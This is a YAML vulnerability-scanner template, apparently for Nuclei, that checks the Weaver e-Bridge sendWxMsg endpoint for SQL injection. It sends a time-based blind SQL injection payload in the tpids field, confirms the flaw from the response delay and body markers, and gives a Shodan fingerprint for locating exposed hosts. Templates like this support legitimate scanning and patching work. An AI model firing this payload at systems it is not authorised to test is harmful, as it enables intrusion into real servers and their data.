id: poc-yaml-weaver-e-bridge-sendwxmsg-sqli
info:
  name: 泛微云桥 e-Bridge sendWxMsg SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: weaver-ebridge
    shodan: app="泛微-云桥e-Bridge"

variables:
  t1: "{{rand_int(5,10)}}"
  t2: "{{to_number(t1) + 2}}"

http:
  - raw:
      - |
        POST /wxthirdapi/sendWxMsg HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        userids=-1&tpids=1%27+or+%28select+%2A+from+%28select+sleep%28{{t1}}%29%29x%29+or+%27x%27%3D%27x
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "\"syscorpids\":"
          - "没有对应的消息模板"
      - type: word
        part: header
        words:
          - "application/json"
      - type: dsl
        dsl:
          - "!contains(body, '<')"
          - "to_number(duration) > to_number(t1)"
          - "to_number(duration) < to_number(t2)"
